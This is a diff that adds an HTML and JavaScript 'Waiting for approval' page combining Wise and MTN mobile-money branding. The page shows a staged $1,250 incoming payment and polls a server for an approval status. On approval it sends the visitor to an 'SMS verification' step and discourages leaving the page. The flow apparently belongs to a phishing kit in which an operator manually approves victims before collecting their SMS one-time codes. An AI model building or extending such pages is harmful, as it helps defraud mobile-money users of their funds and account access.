@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Waiting for approval · MTN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --wise-green: #9FE870;
+    --wise-forest: #0E1B0F;
+    --wise-grey: #6B7C6E;
+    --wise-border: #DDE5DF;
+    --wise-white: #FFFFFF;
+    --wise-error: #D14343;
+    --wise-success: #0E7C3A;
+    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
+    --mtn-yellow: #FFCC00;
+    --mtn-yellow-dark: #E6B800;
+    --mtn-black: #000000;
+    --mtn-border: #E4E4E4;
+    --mtn-text: #1A1A1A;
+    --mtn-text-light: #6B6B6B;
+    --mtn-text-muted: #9B9B9B;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .page-content {
+    max-width: 460px;
+    width: 100%;
+    text-align: center;
+    animation: contentPop 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
+  }
+  @keyframes contentPop {
+    from { opacity: 0; transform: translateY(14px) scale(0.97); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* Animated dual ring */
+  .waiting-ring {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 2rem;
+    position: relative;
+  }
+  .waiting-ring::before,
+  .waiting-ring::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 4px solid transparent;
+  }
+  .waiting-ring::before {
+    border-top-color: var(--mtn-yellow);
+    border-right-color: var(--mtn-yellow);
+    animation: spinRing 1.2s linear infinite;
+  }
+  .waiting-ring::after {
+    inset: 14px;
+    border-bottom-color: var(--wise-green);
+    border-left-color: var(--wise-green);
+    animation: spinRing 1.6s linear infinite reverse;
+  }
+  @keyframes spinRing { to { transform: rotate(360deg); } }
+
+  .waiting-center {
+    position: absolute;
+    inset: 34px;
+    background: var(--mtn-black);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1;
+    font-weight: 800;
+    font-size: 0.62rem;
+    color: var(--mtn-yellow);
+    letter-spacing: -0.02em;
+  }
+
+  .waiting-title {
+    font-size: 1.5rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--mtn-text);
+    margin-bottom: 0.6rem;
+    line-height: 1.25;
+  }
+  .waiting-subtitle {
+    font-size: 0.92rem;
+    color: var(--mtn-text-light);
+    line-height: 1.55;
+    margin-bottom: 2rem;
+    font-weight: 400;
+    max-width: 360px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  /* Info card */
+  .waiting-info {
+    background: var(--wise-white);
+    border: 1px solid var(--mtn-border);
+    border-radius: 1rem;
+    padding: 1.25rem;
+    text-align: left;
+    box-shadow: 0 8px 20px -8px rgba(0,0,0,0.08);
+    margin-bottom: 1.5rem;
+  }
+  .waiting-info-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 0.55rem 0;
+    font-size: 0.83rem;
+    border-bottom: 1px solid #F0F0F0;
+    gap: 0.75rem;
+  }
+  .waiting-info-row:first-child { padding-top: 0; }
+  .waiting-info-row:last-child { border-bottom: none; padding-bottom: 0; }
+  .waiting-info-row .k {
+    color: var(--mtn-text-light);
+    font-weight: 500;
+    flex-shrink: 0;
+  }
+  .waiting-info-row .v {
+    color: var(--mtn-text);
+    font-weight: 600;
+    text-align: right;
+    word-break: break-word;
+  }
+  .waiting-info-row .v .mono {
+    font-family: 'SF Mono', Menlo, Consolas, monospace;
+    font-size: 0.78rem;
+    letter-spacing: 0.02em;
+    background: #F7F7F7;
+    padding: 0.15rem 0.5rem;
+    border-radius: 6px;
+  }
+
+  /* Animated status dots */
+  .waiting-dots {
+    display: inline-flex;
+    gap: 0.3rem;
+    align-items: center;
+    vertical-align: middle;
+  }
+  .waiting-dots span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--mtn-yellow-dark);
+    animation: dotPulse 1.4s infinite ease-in-out both;
+  }
+  .waiting-dots span:nth-child(2) { animation-delay: 0.16s; }
+  .waiting-dots span:nth-child(3) { animation-delay: 0.32s; }
+  @keyframes dotPulse {
+    0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); }
+    40% { opacity: 1; transform: scale(1); }
+  }
+
+  /* Status badge */
+  .status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.35rem 0.75rem;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    letter-spacing: 0.01em;
+  }
+  .status-badge.pending {
+    background: #FFF8E1;
+    color: #8A6D00;
+    border: 1px solid #FFE082;
+  }
+  .status-badge.approved {
+    background: #E8F5E9;
+    color: var(--wise-success);
+    border: 1px solid #B8DFC6;
+  }
+  .status-badge.declined {
+    background: #FDECEC;
+    color: var(--wise-error);
+    border: 1px solid #F3BFBF;
+  }
+  .status-badge svg {
+    width: 13px; height: 13px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  /* Timer */
+  .waiting-timer {
+    font-size: 0.78rem;
+    color: var(--mtn-text-muted);
+    font-weight: 500;
+    margin-top: 1.25rem;
+    font-variant-numeric: tabular-nums;
+  }
+  .waiting-timer .secs {
+    color: var(--mtn-text);
+    font-weight: 700;
+  }
+
+  /* Note */
+  .waiting-note {
+    font-size: 0.78rem;
+    color: var(--mtn-text-muted);
+    line-height: 1.55;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+    text-align: left;
+    max-width: 360px;
+    margin: 1.5rem auto 0;
+  }
+  .waiting-note svg {
+    width: 15px; height: 15px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  /* Progress bar */
+  .waiting-progress {
+    height: 4px;
+    background: #EFEFEF;
+    border-radius: 2px;
+    overflow: hidden;
+    margin-top: 1.5rem;
+    max-width: 280px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .waiting-progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, var(--mtn-yellow) 0%, #FFB800 100%);
+    border-radius: 2px;
+    transition: width 0.4s ease;
+  }
+
+  @media (max-width: 480px) {
+    .waiting-title { font-size: 1.3rem; }
+    .waiting-info { padding: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="page-content">
+  <div class="waiting-ring">
+    <div class="waiting-center">MTN</div>
+  </div>
+
+  <h1 class="waiting-title" id="waitingTitle">Waiting for approval</h1>
+  <p class="waiting-subtitle" id="waitingSubtitle">
+    Your transaction has been sent for verification. This usually takes a few seconds.
+  </p>
+
+  <div class="waiting-info">
+    <div class="waiting-info-row">
+      <span class="k">Transaction ID</span>
+      <span class="v"><span class="mono" id="infoTxnId">—</span></span>
+    </div>
+    <div class="waiting-info-row">
+      <span class="k">Recipient</span>
+      <span class="v" id="infoRecipient">—</span>
+    </div>
+    <div class="waiting-info-row">
+      <span class="k">Number</span>
+      <span class="v" id="infoNumber">—</span>
+    </div>
+    <div class="waiting-info-row">
+      <span class="k">Amount</span>
+      <span class="v" id="infoAmount">—</span>
+    </div>
+    <div class="waiting-info-row">
+      <span class="k">Status</span>
+      <span class="v">
+        <span class="status-badge pending" id="statusBadge">
+          <span class="waiting-dots"><span></span><span></span><span></span></span>
+          <span id="statusText">Awaiting approval</span>
+        </span>
+      </span>
+    </div>
+  </div>
+
+  <div class="waiting-progress">
+    <div class="waiting-progress-fill" id="progressFill"></div>
+  </div>
+
+  <div class="waiting-timer">
+    <span class="secs" id="timerSecs">0</span>s elapsed · checking for approval…
+  </div>
+
+  <p class="waiting-note">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+    Do not close this page. Once approved, you'll be moved to the SMS verification step automatically.
+  </p>
+</div>
+
+<script>
+(function() {
+  const STORAGE_KEY = 'wise_payment_data';
+  const DEFAULT_DATA = {
+    senderName: 'Maya Chen',
+    senderEmail: 'maya.chen@example.com',
+    amount: 1250.00,
+    currency: 'USD',
+    reference: 'WISE-2025-4F2A',
+    note: 'Payment for design services'
+  };
+
+  const CURRENCY_INFO = {
+    UGX: 3800, KES: 129, TZS: 2650, RWF: 1400, GHS: 15.5,
+    NGN: 1550, ZAR: 18.5, XOF: 605, XAF: 605, ZMW: 26,
+    MWK: 1730, USD: 1
+  };
+
+  const paymentData = (function(){
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      return raw ? { ...DEFAULT_DATA, ...JSON.parse(raw) } : { ...DEFAULT_DATA };
+    } catch(e) { return { ...DEFAULT_DATA }; }
+  })();
+
+  const session = (function(){
+    try {
+      const raw = sessionStorage.getItem('wise_session');
+      return raw ? JSON.parse(raw) : {};
+    } catch(e) { return {}; }
+  })();
+
+  const $ = id => document.getElementById(id);
+  const waitingTitle = $('waitingTitle');
+  const waitingSubtitle = $('waitingSubtitle');
+  const infoTxnId = $('infoTxnId');
+  const infoRecipient = $('infoRecipient');
+  const infoNumber = $('infoNumber');
+  const infoAmount = $('infoAmount');
+  const statusBadge = $('statusBadge');
+  const statusText = $('statusText');
+  const timerSecs = $('timerSecs');
+  const progressFill = $('progressFill');
+
+  // ---- Guard: must have a session ----
+  if (!session.txnId) {
+    // No transaction found → send back to mtn.html
+    window.location.replace('mtn.html');
+    return;
+  }
+
+  const txnId = session.txnId;
+
+  // ---- Helpers ----
+  function fmtAmount(n) {
+    return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
+  function fmtPhone(p) {
+    if (!p) return '—';
+    const m = String(p).match(/^(\+\d{1,3})(\d{3})(\d{3})(\d{3,})$/);
+    if (m) return `${m[1]} ${m[2]} ${m[3]} ${m[4]}`;
+    return p;
+  }
+
+  // ---- Render session details ----
+  infoTxnId.textContent = txnId;
+  infoRecipient.textContent = session.recipientName || '—';
+  infoNumber.textContent = fmtPhone(session.recipientPhone);
+  infoAmount.textContent = `${session.localAmount || fmtAmount(paymentData.amount)} ${session.localCurrency || paymentData.currency}`;
+
+  // ---- Elapsed timer ----
+  const startedAt = Date.now();
+  const timerInterval = setInterval(() => {
+    const elapsed = Math.floor((Date.now() - startedAt) / 1000);
+    timerSecs.textContent = elapsed;
+    // Progress bar caps at 60s
+    const pct = Math.min(100, (elapsed / 60) * 100);
+    progressFill.style.width = pct + '%';
+  }, 500);
+
+  // ---- Polling for approval ----
+  let pollInterval = null;
+  let currentStatus = 'pending';
+
+  function stopPolling() {
+    if (pollInterval) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+    }
+    clearInterval(timerInterval);
+  }
+
+  function setStatus(status) {
+    currentStatus = status;
+    statusBadge.classList.remove('pending', 'approved', 'declined');
+
+    if (status === 'approved') {
+      statusBadge.classList.add('approved');
+      statusText.textContent = 'Approved';
+      statusBadge.querySelector('.waiting-dots').innerHTML =
+        '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>';
+      waitingTitle.textContent = 'Approved!';
+      waitingSubtitle.textContent = 'Redirecting you to the SMS verification step…';
+    } else if (status === 'declined') {
+      statusBadge.classList.add('declined');
+      statusText.textContent = 'Declined';
+      statusBadge.querySelector('.waiting-dots').innerHTML =
+        '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
+      waitingTitle.textContent = 'Transaction declined';
+      waitingSubtitle.textContent = 'Please check your details and try again.';
+    } else {
+      statusBadge.classList.add('pending');
+      statusText.textContent = 'Awaiting approval';
+      statusBadge.querySelector('.waiting-dots').innerHTML =
+        '<span></span><span></span><span></span>';
+    }
+  }
+
+  async function checkStatus() {
+    try {
+      const res = await fetch(`/api/status/${encodeURIComponent(txnId)}`);
+      const data = await res.json();
+
+      if (data.status === 'approved') {
+        stopPolling();
+        setStatus('approved');
+        // Small delay so user sees the success state, then navigate
+        setTimeout(() => {
+          window.location.href = 'sms.html';
+        }, 700);
+      } else if (data.status === 'declined') {
+        stopPolling();
+        setStatus('declined');
+        setTimeout(() => {
+          window.location.href = 'mtn.html';
+        }, 1600);
+      } else {
+        // Still pending — keep polling
+        setStatus('pending');
+      }
+    } catch (err) {
+      // Network error → don't crash, just keep trying
+      console.warn('Status check failed:', err.message);
+    }
+  }
+
+  // First check immediately, then every 1.5s
+  checkStatus();
+  pollInterval = setInterval(checkStatus, 1500);
+
+  // ---- Fallback: if nothing happens after 90s, show a message ----
+  setTimeout(() => {
+    if (currentStatus === 'pending') {
+      waitingSubtitle.textContent = 'Taking longer than expected. Please wait or refresh the page.';
+    }
+  }, 90000);
+
+  // ---- Prevent accidental navigation ----
+  window.addEventListener('beforeunload', (e) => {
+    if (currentStatus === 'pending') {
+      e.preventDefault();
+      e.returnValue = '';
+    }
+  });
+})();
+</script>
+</body>
+</html>
